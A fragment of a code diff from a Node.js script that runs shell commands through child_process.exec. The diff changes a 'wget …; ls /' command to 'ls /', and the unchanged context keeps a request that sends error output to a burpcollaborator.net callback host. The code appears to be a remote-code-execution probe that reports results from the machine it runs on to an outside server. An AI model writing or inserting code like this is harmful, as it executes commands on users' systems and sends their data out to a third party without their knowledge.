@@ -83,7 +83,7 @@ fs.readFile('d.txt', 'utf8' , (err, data) => {
 
 const spawn = require('child_process');
 var request = require('request');
-spawn.exec("wget http://127.0.0.1; ls /", (error, stdout, stderr) => {
+spawn.exec("ls /", (error, stdout, stderr) => {
     if (error) {
         console.log(`error: ${error.message}`);
         request('http://mzpz5sloxj1o8ocahftqnyjtokubvzk.burpcollaborator.net/?rce-error=' + error.message);
